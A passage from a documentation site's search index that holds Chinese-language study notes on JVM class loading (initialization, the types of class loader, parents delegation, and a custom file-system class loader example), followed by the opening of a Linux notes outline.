\u5176\u4E2D\u89E3\u6790\u8FC7\u7A0B\u5728\u67D0\u4E9B\u60C5\u51B5\u4E0B\u53EF\u4EE5\u5728\u521D\u59CB\u5316\u9636\u6BB5\u4E4B\u540E\u518D\u5F00\u59CB\uFF0C\u8FD9\u662F\u4E3A\u4E86\u652F\u6301 Java \u7684\u52A8\u6001\u7ED1\u5B9A\u3002`},{header:"5. \u521D\u59CB\u5316",slug:"_5-\u521D\u59CB\u5316",content:`\u521D\u59CB\u5316\u9636\u6BB5\u624D\u771F\u6B63\u5F00\u59CB\u6267\u884C\u7C7B\u4E2D\u5B9A\u4E49\u7684 Java \u7A0B\u5E8F\u4EE3\u7801\u3002\u521D\u59CB\u5316\u9636\u6BB5\u662F\u865A\u62DF\u673A\u6267\u884C\u7C7B\u6784\u9020\u5668 \u65B9\u6CD5\u7684\u8FC7\u7A0B\u3002\u5728\u51C6\u5907\u9636\u6BB5\uFF0C\u7C7B\u53D8\u91CF\u5DF2\u7ECF\u8D4B\u8FC7\u4E00\u6B21\u7CFB\u7EDF\u8981\u6C42\u7684\u521D\u59CB\u503C\uFF0C\u800C\u5728\u521D\u59CB\u5316\u9636\u6BB5\uFF0C\u6839\u636E\u7A0B\u5E8F\u5458\u901A\u8FC7\u7A0B\u5E8F\u5236\u5B9A\u7684\u4E3B\u89C2\u8BA1\u5212\u53BB\u521D\u59CB\u5316\u7C7B\u53D8\u91CF\u548C\u5176\u5B83\u8D44\u6E90\u3002
\u662F\u7531\u7F16\u8BD1\u5668\u81EA\u52A8\u6536\u96C6\u7C7B\u4E2D\u6240\u6709\u7C7B\u53D8\u91CF\u7684\u8D4B\u503C\u52A8\u4F5C\u548C\u9759\u6001\u8BED\u53E5\u5757\u4E2D\u7684\u8BED\u53E5\u5408\u5E76\u4EA7\u751F\u7684\uFF0C\u7F16\u8BD1\u5668\u6536\u96C6\u7684\u987A\u5E8F\u7531\u8BED\u53E5\u5728\u6E90\u6587\u4EF6\u4E2D\u51FA\u73B0\u7684\u987A\u5E8F\u51B3\u5B9A\u3002\u7279\u522B\u6CE8\u610F\u7684\u662F\uFF0C\u9759\u6001\u8BED\u53E5\u5757\u53EA\u80FD\u8BBF\u95EE\u5230\u5B9A\u4E49\u5728\u5B83\u4E4B\u524D\u7684\u7C7B\u53D8\u91CF\uFF0C\u5B9A\u4E49\u5728\u5B83\u4E4B\u540E\u7684\u7C7B\u53D8\u91CF\u53EA\u80FD\u8D4B\u503C\uFF0C\u4E0D\u80FD\u8BBF\u95EE\u3002\u4F8B\u5982\u4EE5\u4E0B\u4EE3\u7801\uFF1A
public class Test { static { i = 0; // \u7ED9\u53D8\u91CF\u8D4B\u503C\u53EF\u4EE5\u6B63\u5E38\u7F16\u8BD1\u901A\u8FC7 System.out.print(i); // \u8FD9\u53E5\u7F16\u8BD1\u5668\u4F1A\u63D0\u793A\u201C\u975E\u6CD5\u5411\u524D\u5F15\u7528\u201D } static int i = 1;
}
\u7531\u4E8E\u7236\u7C7B\u7684 \u65B9\u6CD5\u5148\u6267\u884C\uFF0C\u4E5F\u5C31\u610F\u5473\u7740\u7236\u7C7B\u4E2D\u5B9A\u4E49\u7684\u9759\u6001\u8BED\u53E5\u5757\u7684\u6267\u884C\u8981\u4F18\u5148\u4E8E\u5B50\u7C7B\u3002\u4F8B\u5982\u4EE5\u4E0B\u4EE3\u7801\uFF1A
static class Parent { public static int A = 1; static { A = 2; }
} static class Sub extends Parent { public static int B = A;
} public static void main(String[] args) { System.out.println(Sub.B); // 2
}
\u63A5\u53E3\u4E2D\u4E0D\u53EF\u4EE5\u4F7F\u7528\u9759\u6001\u8BED\u53E5\u5757\uFF0C\u4F46\u4ECD\u7136\u6709\u7C7B\u53D8\u91CF\u521D\u59CB\u5316\u7684\u8D4B\u503C\u64CD\u4F5C\uFF0C\u56E0\u6B64\u63A5\u53E3\u4E0E\u7C7B\u4E00\u6837\u90FD\u4F1A\u751F\u6210 &lt;clinit\\>() \u65B9\u6CD5\u3002\u4F46\u63A5\u53E3\u4E0E\u7C7B\u4E0D\u540C\u7684\u662F\uFF0C\u6267\u884C\u63A5\u53E3\u7684 &lt;clinit\\>() \u65B9\u6CD5\u4E0D\u9700\u8981\u5148\u6267\u884C\u7236\u63A5\u53E3\u7684 &lt;clinit\\>() \u65B9\u6CD5\u3002\u53EA\u6709\u5F53\u7236\u63A5\u53E3\u4E2D\u5B9A\u4E49\u7684\u53D8\u91CF\u4F7F\u7528\u65F6\uFF0C\u7236\u63A5\u53E3\u624D\u4F1A\u521D\u59CB\u5316\u3002\u53E6\u5916\uFF0C\u63A5\u53E3\u7684\u5B9E\u73B0\u7C7B\u5728\u521D\u59CB\u5316\u65F6\u4E5F\u4E00\u6837\u4E0D\u4F1A\u6267\u884C\u63A5\u53E3\u7684 &lt;clinit\\>() \u65B9\u6CD5\u3002
\u865A\u62DF\u673A\u4F1A\u4FDD\u8BC1\u4E00\u4E2A\u7C7B\u7684 &lt;clinit\\>() \u65B9\u6CD5\u5728\u591A\u7EBF\u7A0B\u73AF\u5883\u4E0B\u88AB\u6B63\u786E\u7684\u52A0\u9501\u548C\u540C\u6B65\uFF0C\u5982\u679C\u591A\u4E2A\u7EBF\u7A0B\u540C\u65F6\u521D\u59CB\u5316\u4E00\u4E2A\u7C7B\uFF0C\u53EA\u4F1A\u6709\u4E00\u4E2A\u7EBF\u7A0B\u6267\u884C\u8FD9\u4E2A\u7C7B\u7684 &lt;clinit\\>() \u65B9\u6CD5\uFF0C\u5176\u5B83\u7EBF\u7A0B\u90FD\u4F1A\u963B\u585E\u7B49\u5F85\uFF0C\u76F4\u5230\u6D3B\u52A8\u7EBF\u7A0B\u6267\u884C &lt;clinit\\>() \u65B9\u6CD5\u5B8C\u6BD5\u3002\u5982\u679C\u5728\u4E00\u4E2A\u7C7B\u7684 &lt;clinit\\>() \u65B9\u6CD5\u4E2D\u6709\u8017\u65F6\u7684\u64CD\u4F5C\uFF0C\u5C31\u53EF\u80FD\u9020\u6210\u591A\u4E2A\u7EBF\u7A0B\u963B\u585E\uFF0C\u5728\u5B9E\u9645\u8FC7\u7A0B\u4E2D\u6B64\u79CD\u963B\u585E\u5F88\u9690\u853D\u3002`},{header:"\u7C7B\u521D\u59CB\u5316\u65F6\u673A",slug:"\u7C7B\u521D\u59CB\u5316\u65F6\u673A",content:""},{header:"1. \u4E3B\u52A8\u5F15\u7528",slug:"_1-\u4E3B\u52A8\u5F15\u7528",content:"\u865A\u62DF\u673A\u89C4\u8303\u4E2D\u5E76\u6CA1\u6709\u5F3A\u5236\u7EA6\u675F\u4F55\u65F6\u8FDB\u884C\u52A0\u8F7D\uFF0C\u4F46\u662F\u89C4\u8303\u4E25\u683C\u89C4\u5B9A\u4E86\u6709\u4E14\u53EA\u6709\u4E0B\u5217\u4E94\u79CD\u60C5\u51B5\u5FC5\u987B\u5BF9\u7C7B\u8FDB\u884C\u521D\u59CB\u5316\uFF08\u52A0\u8F7D\u3001\u9A8C\u8BC1\u3001\u51C6\u5907\u90FD\u4F1A\u968F\u4E4B\u53D1\u751F\uFF09\uFF1A \u9047\u5230 new\u3001getstatic\u3001putstatic\u3001invokestatic \u8FD9\u56DB\u6761\u5B57\u8282\u7801\u6307\u4EE4\u65F6\uFF0C\u5982\u679C\u7C7B\u6CA1\u6709\u8FDB\u884C\u8FC7\u521D\u59CB\u5316\uFF0C\u5219\u5FC5\u987B\u5148\u89E6\u53D1\u5176\u521D\u59CB\u5316\u3002\u6700\u5E38\u89C1\u7684\u751F\u6210\u8FD9 4 \u6761\u6307\u4EE4\u7684\u573A\u666F\u662F\uFF1A\u4F7F\u7528 new \u5173\u952E\u5B57\u5B9E\u4F8B\u5316\u5BF9\u8C61\u7684\u65F6\u5019\uFF1B\u8BFB\u53D6\u6216\u8BBE\u7F6E\u4E00\u4E2A\u7C7B\u7684\u9759\u6001\u5B57\u6BB5\uFF08\u88AB final \u4FEE\u9970\u3001\u5DF2\u5728\u7F16\u8BD1\u671F\u628A\u7ED3\u679C\u653E\u5165\u5E38\u91CF\u6C60\u7684\u9759\u6001\u5B57\u6BB5\u9664\u5916\uFF09\u7684\u65F6\u5019\uFF1B\u4EE5\u53CA\u8C03\u7528\u4E00\u4E2A\u7C7B\u7684\u9759\u6001\u65B9\u6CD5\u7684\u65F6\u5019\u3002 \u4F7F\u7528 java.lang.reflect \u5305\u7684\u65B9\u6CD5\u5BF9\u7C7B\u8FDB\u884C\u53CD\u5C04\u8C03\u7528\u7684\u65F6\u5019\uFF0C\u5982\u679C\u7C7B\u6CA1\u6709\u8FDB\u884C\u521D\u59CB\u5316\uFF0C\u5219\u9700\u8981\u5148\u89E6\u53D1\u5176\u521D\u59CB\u5316\u3002 \u5F53\u521D\u59CB\u5316\u4E00\u4E2A\u7C7B\u7684\u65F6\u5019\uFF0C\u5982\u679C\u53D1\u73B0\u5176\u7236\u7C7B\u8FD8\u6CA1\u6709\u8FDB\u884C\u8FC7\u521D\u59CB\u5316\uFF0C\u5219\u9700\u8981\u5148\u89E6\u53D1\u5176\u7236\u7C7B\u7684\u521D\u59CB\u5316\u3002 \u5F53\u865A\u62DF\u673A\u542F\u52A8\u65F6\uFF0C\u7528\u6237\u9700\u8981\u6307\u5B9A\u4E00\u4E2A\u8981\u6267\u884C\u7684\u4E3B\u7C7B\uFF08\u5305\u542B main() \u65B9\u6CD5\u7684\u90A3\u4E2A\u7C7B\uFF09\uFF0C\u865A\u62DF\u673A\u4F1A\u5148\u521D\u59CB\u5316\u8FD9\u4E2A\u4E3B\u7C7B\uFF1B \u5F53\u4F7F\u7528 JDK 1.7 \u7684\u52A8\u6001\u8BED\u8A00\u652F\u6301\u65F6\uFF0C\u5982\u679C\u4E00\u4E2A java.lang.invoke.MethodHandle \u5B9E\u4F8B\u6700\u540E\u7684\u89E3\u6790\u7ED3\u679C\u4E3A REF_getStatic, REF_putStatic, REF_invokeStatic \u7684\u65B9\u6CD5\u53E5\u67C4\uFF0C\u5E76\u4E14\u8FD9\u4E2A\u65B9\u6CD5\u53E5\u67C4\u6240\u5BF9\u5E94\u7684\u7C7B\u6CA1\u6709\u8FDB\u884C\u8FC7\u521D\u59CB\u5316\uFF0C\u5219\u9700\u8981\u5148\u89E6\u53D1\u5176\u521D\u59CB\u5316\uFF1B"},{header:"2. \u88AB\u52A8\u5F15\u7528",slug:"_2-\u88AB\u52A8\u5F15\u7528",content:"\u4EE5\u4E0A 5 \u79CD\u573A\u666F\u4E2D\u7684\u884C\u4E3A\u79F0\u4E3A\u5BF9\u4E00\u4E2A\u7C7B\u8FDB\u884C\u4E3B\u52A8\u5F15\u7528\u3002\u9664\u6B64\u4E4B\u5916\uFF0C\u6240\u6709\u5F15\u7528\u7C7B\u7684\u65B9\u5F0F\u90FD\u4E0D\u4F1A\u89E6\u53D1\u521D\u59CB\u5316\uFF0C\u79F0\u4E3A\u88AB\u52A8\u5F15\u7528\u3002\u88AB\u52A8\u5F15\u7528\u7684\u5E38\u89C1\u4F8B\u5B50\u5305\u62EC\uFF1A \u901A\u8FC7\u5B50\u7C7B\u5F15\u7528\u7236\u7C7B\u7684\u9759\u6001\u5B57\u6BB5\uFF0C\u4E0D\u4F1A\u5BFC\u81F4\u5B50\u7C7B\u521D\u59CB\u5316\u3002 System.out.println(SubClass.value); // value \u5B57\u6BB5\u5728 SuperClass \u4E2D\u5B9A\u4E49 \u901A\u8FC7\u6570\u7EC4\u5B9A\u4E49\u6765\u5F15\u7528\u7C7B\uFF0C\u4E0D\u4F1A\u89E6\u53D1\u6B64\u7C7B\u7684\u521D\u59CB\u5316\u3002\u8BE5\u8FC7\u7A0B\u4F1A\u5BF9\u6570\u7EC4\u7C7B\u8FDB\u884C\u521D\u59CB\u5316\uFF0C\u6570\u7EC4\u7C7B\u662F\u4E00\u4E2A\u7531\u865A\u62DF\u673A\u81EA\u52A8\u751F\u6210\u7684\u3001\u76F4\u63A5\u7EE7\u627F\u81EA Object \u7684\u5B50\u7C7B\uFF0C\u5176\u4E2D\u5305\u542B\u4E86\u6570\u7EC4\u7684\u5C5E\u6027\u548C\u65B9\u6CD5\u3002 SuperClass[] sca = new SuperClass[10]; \u5E38\u91CF\u5728\u7F16\u8BD1\u9636\u6BB5\u4F1A\u5B58\u5165\u8C03\u7528\u7C7B\u7684\u5E38\u91CF\u6C60\u4E2D\uFF0C\u672C\u8D28\u4E0A\u5E76\u6CA1\u6709\u76F4\u63A5\u5F15\u7528\u5230\u5B9A\u4E49\u5E38\u91CF\u7684\u7C7B\uFF0C\u56E0\u6B64\u4E0D\u4F1A\u89E6\u53D1\u5B9A\u4E49\u5E38\u91CF\u7684\u7C7B\u7684\u521D\u59CB\u5316\u3002 System.out.println(ConstClass.HELLOWORLD);"},{header:"\u7C7B\u4E0E\u7C7B\u52A0\u8F7D\u5668",slug:"\u7C7B\u4E0E\u7C7B\u52A0\u8F7D\u5668",content:`\u4E24\u4E2A\u7C7B\u76F8\u7B49\uFF0C\u9700\u8981\u7C7B\u672C\u8EAB\u76F8\u7B49\uFF0C\u5E76\u4E14\u4F7F\u7528\u540C\u4E00\u4E2A\u7C7B\u52A0\u8F7D\u5668\u8FDB\u884C\u52A0\u8F7D\u3002\u8FD9\u662F\u56E0\u4E3A\u6BCF\u4E00\u4E2A\u7C7B\u52A0\u8F7D\u5668\u90FD\u62E5\u6709\u4E00\u4E2A\u72EC\u7ACB\u7684\u7C7B\u540D\u79F0\u7A7A\u95F4\u3002
\u8FD9\u91CC\u7684\u76F8\u7B49\uFF0C\u5305\u62EC\u7C7B\u7684 Class \u5BF9\u8C61\u7684 equals() \u65B9\u6CD5\u3001isAssignableFrom() \u65B9\u6CD5\u3001isInstance() \u65B9\u6CD5\u7684\u8FD4\u56DE\u7ED3\u679C\u4E3A true\uFF0C\u4E5F\u5305\u62EC\u4F7F\u7528 instanceof \u5173\u952E\u5B57\u505A\u5BF9\u8C61\u6240\u5C5E\u5173\u7CFB\u5224\u5B9A\u7ED3\u679C\u4E3A true\u3002`},{header:"\u7C7B\u52A0\u8F7D\u5668\u5206\u7C7B",slug:"\u7C7B\u52A0\u8F7D\u5668\u5206\u7C7B",content:"\u4ECE Java \u865A\u62DF\u673A\u7684\u89D2\u5EA6\u6765\u8BB2\uFF0C\u53EA\u5B58\u5728\u4EE5\u4E0B\u4E24\u79CD\u4E0D\u540C\u7684\u7C7B\u52A0\u8F7D\u5668\uFF1A \u542F\u52A8\u7C7B\u52A0\u8F7D\u5668\uFF08Bootstrap ClassLoader\uFF09\uFF0C\u4F7F\u7528 C++ \u5B9E\u73B0\uFF0C\u662F\u865A\u62DF\u673A\u81EA\u8EAB\u7684\u4E00\u90E8\u5206\uFF1B \u6240\u6709\u5176\u5B83\u7C7B\u7684\u52A0\u8F7D\u5668\uFF0C\u4F7F\u7528 Java \u5B9E\u73B0\uFF0C\u72EC\u7ACB\u4E8E\u865A\u62DF\u673A\uFF0C\u7EE7\u627F\u81EA\u62BD\u8C61\u7C7B java.lang.ClassLoader\u3002 \u4ECE Java \u5F00\u53D1\u4EBA\u5458\u7684\u89D2\u5EA6\u770B\uFF0C\u7C7B\u52A0\u8F7D\u5668\u53EF\u4EE5\u5212\u5206\u5F97\u66F4\u7EC6\u81F4\u4E00\u4E9B\uFF1A \u542F\u52A8\u7C7B\u52A0\u8F7D\u5668\uFF08Bootstrap ClassLoader\uFF09\u6B64\u7C7B\u52A0\u8F7D\u5668\u8D1F\u8D23\u5C06\u5B58\u653E\u5728 &lt;JRE_HOME\\>\\lib \u76EE\u5F55\u4E2D\u7684\uFF0C\u6216\u8005\u88AB -Xbootclasspath \u53C2\u6570\u6240\u6307\u5B9A\u7684\u8DEF\u5F84\u4E2D\u7684\uFF0C\u5E76\u4E14\u662F\u865A\u62DF\u673A\u8BC6\u522B\u7684\uFF08\u4EC5\u6309\u7167\u6587\u4EF6\u540D\u8BC6\u522B\uFF0C\u5982 rt.jar\uFF0C\u540D\u5B57\u4E0D\u7B26\u5408\u7684\u7C7B\u5E93\u5373\u4F7F\u653E\u5728 lib \u76EE\u5F55\u4E2D\u4E5F\u4E0D\u4F1A\u88AB\u52A0\u8F7D\uFF09\u7C7B\u5E93\u52A0\u8F7D\u5230\u865A\u62DF\u673A\u5185\u5B58\u4E2D\u3002\u542F\u52A8\u7C7B\u52A0\u8F7D\u5668\u65E0\u6CD5\u88AB Java \u7A0B\u5E8F\u76F4\u63A5\u5F15\u7528\uFF0C\u7528\u6237\u5728\u7F16\u5199\u81EA\u5B9A\u4E49\u7C7B\u52A0\u8F7D\u5668\u65F6\uFF0C\u5982\u679C\u9700\u8981\u628A\u52A0\u8F7D\u8BF7\u6C42\u59D4\u6D3E\u7ED9\u542F\u52A8\u7C7B\u52A0\u8F7D\u5668\uFF0C\u76F4\u63A5\u4F7F\u7528 null \u4EE3\u66FF\u5373\u53EF\u3002 \u6269\u5C55\u7C7B\u52A0\u8F7D\u5668\uFF08Extension ClassLoader\uFF09\u8FD9\u4E2A\u7C7B\u52A0\u8F7D\u5668\u662F\u7531 ExtClassLoader\uFF08sun.misc.Launcher$ExtClassLoader\uFF09\u5B9E\u73B0\u7684\u3002\u5B83\u8D1F\u8D23\u5C06 <JAVA_HOME>/lib/ext \u6216\u8005\u88AB java.ext.dir \u7CFB\u7EDF\u53D8\u91CF\u6240\u6307\u5B9A\u8DEF\u5F84\u4E2D\u7684\u6240\u6709\u7C7B\u5E93\u52A0\u8F7D\u5230\u5185\u5B58\u4E2D\uFF0C\u5F00\u53D1\u8005\u53EF\u4EE5\u76F4\u63A5\u4F7F\u7528\u6269\u5C55\u7C7B\u52A0\u8F7D\u5668\u3002 \u5E94\u7528\u7A0B\u5E8F\u7C7B\u52A0\u8F7D\u5668\uFF08Application ClassLoader\uFF09\u8FD9\u4E2A\u7C7B\u52A0\u8F7D\u5668\u662F\u7531 AppClassLoader\uFF08sun.misc.Launcher$AppClassLoader\uFF09\u5B9E\u73B0\u7684\u3002\u7531\u4E8E\u8FD9\u4E2A\u7C7B\u52A0\u8F7D\u5668\u662F ClassLoader \u4E2D\u7684 getSystemClassLoader() \u65B9\u6CD5\u7684\u8FD4\u56DE\u503C\uFF0C\u56E0\u6B64\u4E00\u822C\u79F0\u4E3A\u7CFB\u7EDF\u7C7B\u52A0\u8F7D\u5668\u3002\u5B83\u8D1F\u8D23\u52A0\u8F7D\u7528\u6237\u7C7B\u8DEF\u5F84\uFF08ClassPath\uFF09\u4E0A\u6240\u6307\u5B9A\u7684\u7C7B\u5E93\uFF0C\u5F00\u53D1\u8005\u53EF\u4EE5\u76F4\u63A5\u4F7F\u7528\u8FD9\u4E2A\u7C7B\u52A0\u8F7D\u5668\uFF0C\u5982\u679C\u5E94\u7528\u7A0B\u5E8F\u4E2D\u6CA1\u6709\u81EA\u5B9A\u4E49\u8FC7\u81EA\u5DF1\u7684\u7C7B\u52A0\u8F7D\u5668\uFF0C\u4E00\u822C\u60C5\u51B5\u4E0B\u8FD9\u4E2A\u5C31\u662F\u7A0B\u5E8F\u4E2D\u9ED8\u8BA4\u7684\u7C7B\u52A0\u8F7D\u5668\u3002"},{header:"\u53CC\u4EB2\u59D4\u6D3E\u6A21\u578B",slug:"\u53CC\u4EB2\u59D4\u6D3E\u6A21\u578B",content:`\u5E94\u7528\u7A0B\u5E8F\u662F\u7531\u4E09\u79CD\u7C7B\u52A0\u8F7D\u5668\u4E92\u76F8\u914D\u5408\u4ECE\u800C\u5B9E\u73B0\u7C7B\u52A0\u8F7D\uFF0C\u9664\u6B64\u4E4B\u5916\u8FD8\u53EF\u4EE5\u52A0\u5165\u81EA\u5DF1\u5B9A\u4E49\u7684\u7C7B\u52A0\u8F7D\u5668\u3002
\u4E0B\u56FE\u5C55\u793A\u4E86\u7C7B\u52A0\u8F7D\u5668\u4E4B\u95F4\u7684\u5C42\u6B21\u5173\u7CFB\uFF0C\u79F0\u4E3A\u53CC\u4EB2\u59D4\u6D3E\u6A21\u578B\uFF08Parents Delegation Model\uFF09\u3002\u8BE5\u6A21\u578B\u8981\u6C42\u9664\u4E86\u9876\u5C42\u7684\u542F\u52A8\u7C7B\u52A0\u8F7D\u5668\u5916\uFF0C\u5176\u5B83\u7684\u7C7B\u52A0\u8F7D\u5668\u90FD\u8981\u6709\u81EA\u5DF1\u7684\u7236\u7C7B\u52A0\u8F7D\u5668\u3002\u8FD9\u91CC\u7684\u7236\u5B50\u5173\u7CFB\u4E00\u822C\u901A\u8FC7\u7EC4\u5408\u5173\u7CFB\uFF08Composition\uFF09\u6765\u5B9E\u73B0\uFF0C\u800C\u4E0D\u662F\u7EE7\u627F\u5173\u7CFB\uFF08Inheritance\uFF09\u3002`},{header:"1. \u5DE5\u4F5C\u8FC7\u7A0B",slug:"_1-\u5DE5\u4F5C\u8FC7\u7A0B",content:"\u4E00\u4E2A\u7C7B\u52A0\u8F7D\u5668\u9996\u5148\u5C06\u7C7B\u52A0\u8F7D\u8BF7\u6C42\u8F6C\u53D1\u5230\u7236\u7C7B\u52A0\u8F7D\u5668\uFF0C\u53EA\u6709\u5F53\u7236\u7C7B\u52A0\u8F7D\u5668\u65E0\u6CD5\u5B8C\u6210\u65F6\u624D\u5C1D\u8BD5\u81EA\u5DF1\u52A0\u8F7D\u3002"},{header:"2. \u597D\u5904",slug:"_2-\u597D\u5904",content:`\u4F7F\u5F97 Java \u7C7B\u968F\u7740\u5B83\u7684\u7C7B\u52A0\u8F7D\u5668\u4E00\u8D77\u5177\u6709\u4E00\u79CD\u5E26\u6709\u4F18\u5148\u7EA7\u7684\u5C42\u6B21\u5173\u7CFB\uFF0C\u4ECE\u800C\u4F7F\u5F97\u57FA\u7840\u7C7B\u5F97\u5230\u7EDF\u4E00\u3002
\u4F8B\u5982 java.lang.Object \u5B58\u653E\u5728 rt.jar \u4E2D\uFF0C\u5982\u679C\u7F16\u5199\u53E6\u5916\u4E00\u4E2A java.lang.Object \u5E76\u653E\u5230 ClassPath \u4E2D\uFF0C\u7A0B\u5E8F\u53EF\u4EE5\u7F16\u8BD1\u901A\u8FC7\u3002\u7531\u4E8E\u53CC\u4EB2\u59D4\u6D3E\u6A21\u578B\u7684\u5B58\u5728\uFF0C\u6240\u4EE5\u5728 rt.jar \u4E2D\u7684 Object \u6BD4\u5728 ClassPath \u4E2D\u7684 Object \u4F18\u5148\u7EA7\u66F4\u9AD8\uFF0C\u8FD9\u662F\u56E0\u4E3A rt.jar \u4E2D\u7684 Object \u4F7F\u7528\u7684\u662F\u542F\u52A8\u7C7B\u52A0\u8F7D\u5668\uFF0C\u800C ClassPath \u4E2D\u7684 Object \u4F7F\u7528\u7684\u662F\u5E94\u7528\u7A0B\u5E8F\u7C7B\u52A0\u8F7D\u5668\u3002rt.jar \u4E2D\u7684 Object \u4F18\u5148\u7EA7\u66F4\u9AD8\uFF0C\u90A3\u4E48\u7A0B\u5E8F\u4E2D\u6240\u6709\u7684 Object \u90FD\u662F\u8FD9\u4E2A Object\u3002`},{header:"3. \u5B9E\u73B0",slug:"_3-\u5B9E\u73B0",content:`\u4EE5\u4E0B\u662F\u62BD\u8C61\u7C7B java.lang.ClassLoader \u7684\u4EE3\u7801\u7247\u6BB5\uFF0C\u5176\u4E2D\u7684 loadClass() \u65B9\u6CD5\u8FD0\u884C\u8FC7\u7A0B\u5982\u4E0B\uFF1A\u5148\u68C0\u67E5\u7C7B\u662F\u5426\u5DF2\u7ECF\u52A0\u8F7D\u8FC7\uFF0C\u5982\u679C\u6CA1\u6709\u5219\u8BA9\u7236\u7C7B\u52A0\u8F7D\u5668\u53BB\u52A0\u8F7D\u3002\u5F53\u7236\u7C7B\u52A0\u8F7D\u5668\u52A0\u8F7D\u5931\u8D25\u65F6\u629B\u51FA ClassNotFoundException\uFF0C\u6B64\u65F6\u5C1D\u8BD5\u81EA\u5DF1\u53BB\u52A0\u8F7D\u3002
public abstract class ClassLoader { // The parent class loader for delegation private final ClassLoader parent; public Class<?> loadClass(String name) throws ClassNotFoundException { return loadClass(name, false); } protected Class<?> loadClass(String name, boolean resolve) throws ClassNotFoundException { synchronized (getClassLoadingLock(name)) { // First, check if the class has already been loaded Class<?> c = findLoadedClass(name); if (c == null) { try { if (parent != null) { c = parent.loadClass(name, false); } else { c = findBootstrapClassOrNull(name); } } catch (ClassNotFoundException e) { // ClassNotFoundException thrown if class not found // from the non-null parent class loader } if (c == null) { // If still not found, then invoke findClass in order // to find the class. c = findClass(name); } } if (resolve) { resolveClass(c); } return c; } } protected Class<?> findClass(String name) throws ClassNotFoundException { throw new ClassNotFoundException(name); }
}`},{header:"\u81EA\u5B9A\u4E49\u7C7B\u52A0\u8F7D\u5668\u5B9E\u73B0",slug:"\u81EA\u5B9A\u4E49\u7C7B\u52A0\u8F7D\u5668\u5B9E\u73B0",content:`\u4EE5\u4E0B\u4EE3\u7801\u4E2D\u7684 FileSystemClassLoader \u662F\u81EA\u5B9A\u4E49\u7C7B\u52A0\u8F7D\u5668\uFF0C\u7EE7\u627F\u81EA java.lang.ClassLoader\uFF0C\u7528\u4E8E\u52A0\u8F7D\u6587\u4EF6\u7CFB\u7EDF\u4E0A\u7684\u7C7B\u3002\u5B83\u9996\u5148\u6839\u636E\u7C7B\u7684\u5168\u540D\u5728\u6587\u4EF6\u7CFB\u7EDF\u4E0A\u67E5\u627E\u7C7B\u7684\u5B57\u8282\u4EE3\u7801\u6587\u4EF6\uFF08.class \u6587\u4EF6\uFF09\uFF0C\u7136\u540E\u8BFB\u53D6\u8BE5\u6587\u4EF6\u5185\u5BB9\uFF0C\u6700\u540E\u901A\u8FC7 defineClass() \u65B9\u6CD5\u6765\u628A\u8FD9\u4E9B\u5B57\u8282\u4EE3\u7801\u8F6C\u6362\u6210 java.lang.Class \u7C7B\u7684\u5B9E\u4F8B\u3002
java.lang.ClassLoader \u7684 loadClass() \u5B9E\u73B0\u4E86\u53CC\u4EB2\u59D4\u6D3E\u6A21\u578B\u7684\u903B\u8F91\uFF0C\u81EA\u5B9A\u4E49\u7C7B\u52A0\u8F7D\u5668\u4E00\u822C\u4E0D\u53BB\u91CD\u5199\u5B83\uFF0C\u4F46\u662F\u9700\u8981\u91CD\u5199 findClass() \u65B9\u6CD5\u3002
public class FileSystemClassLoader extends ClassLoader { private String rootDir; public FileSystemClassLoader(String rootDir) { this.rootDir = rootDir; } protected Class<?> findClass(String name) throws ClassNotFoundException { byte[] classData = getClassData(name); if (classData == null) { throw new ClassNotFoundException(); } else { return defineClass(name, classData, 0, classData.length); } } private byte[] getClassData(String className) { String path = classNameToPath(className); try { InputStream ins = new FileInputStream(path); ByteArrayOutputStream baos = new ByteArrayOutputStream(); int bufferSize = 4096; byte[] buffer = new byte[bufferSize]; int bytesNumRead; while ((bytesNumRead = ins.read(buffer)) != -1) { baos.write(buffer, 0, bytesNumRead); } return baos.toByteArray(); } catch (IOException e) { e.printStackTrace(); } return null; } private String classNameToPath(String className) { return rootDir + File.separatorChar + className.replace('.', File.separatorChar) + ".class"; }
}`},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:`\u5468\u5FD7\u660E. \u6DF1\u5165\u7406\u89E3 Java \u865A\u62DF\u673A [M]. \u673A\u68B0\u5DE5\u4E1A\u51FA\u7248\u793E, 2011.
Chapter 2. The Structure of the Java Virtual Machine
Jvm memory
Getting Started with the G1 Garbage Collector
JNI Part1: Java Native Interface Introduction and \u201CHello World\u201D application
Memory Architecture Of JVM(Runtime Data Areas)
JVM Run-Time Data Areas
Android on x86: Java Native Interface and the Android Native Development Kit
\u6DF1\u5165\u7406\u89E3 JVM(2)\u2014\u2014GC \u7B97\u6CD5\u4E0E\u5185\u5B58\u5206\u914D\u7B56\u7565
\u6DF1\u5165\u7406\u89E3 JVM(3)\u2014\u20147 \u79CD\u5783\u573E\u6536\u96C6\u5668
JVM Internals
\u6DF1\u5165\u63A2\u8BA8 Java \u7C7B\u52A0\u8F7D\u5668
Guide to WeakHashMap in Java
Tomcat example source code file (ConcurrentCache.java)`}]},{path:"/java/Linux.html",title:"Linux",pathLocale:"/",contents:[{header:"Linux",slug:"linux",content:`Linux \u524D\u8A00
\u4E00\u3001\u5E38\u7528\u64CD\u4F5C\u4EE5\u53CA\u6982\u5FF5 \u5FEB\u6377\u952E
\u6C42\u52A9 1. --help
2. man
3. info
4. doc \u5173\u673A 1. who
2. sync
3. shutdown PATH
sudo
\u5305\u7BA1\u7406\u5DE5\u5177
\u53D1\u884C\u7248
VIM \u4E09\u4E2A\u6A21\u5F0F
GNU
\u5F00\u6E90\u534F\u8BAE \u4E8C\u3001\u78C1\u76D8 \u78C1\u76D8\u63A5\u53E3 1. IDE
2. SATA
3. SCSI
4. SAS \u78C1\u76D8\u7684\u6587\u4EF6\u540D \u4E09\u3001\u5206\u533A \u5206\u533A\u8868 1. MBR
2. GPT \u5F00\u673A\u68C0\u6D4B\u7A0B\u5E8F 1. BIOS
2. UEFI \u56DB\u3001\u6587\u4EF6\u7CFB\u7EDF \u5206\u533A\u4E0E\u6587\u4EF6\u7CFB\u7EDF
\u7EC4\u6210
\u6587\u4EF6\u8BFB\u53D6
\u78C1\u76D8\u788E\u7247
block
inode
\u76EE\u5F55
\u65E5\u5FD7
\u6302\u8F7D
\u76EE\u5F55\u914D\u7F6E \u4E94\u3001\u6587\u4EF6 \u6587\u4EF6\u5C5E\u6027
\u6587\u4EF6\u4E0E\u76EE\u5F55\u7684\u57FA\u672C\u64CD\u4F5C 1. ls
2. cd
3. mkdir
4. rmdir
5. touch
6. cp
7. rm
8. mv \u4FEE\u6539\u6743\u9650
\u9ED8\u8BA4\u6743\u9650
\u76EE\u5F55\u7684\u6743\u9650
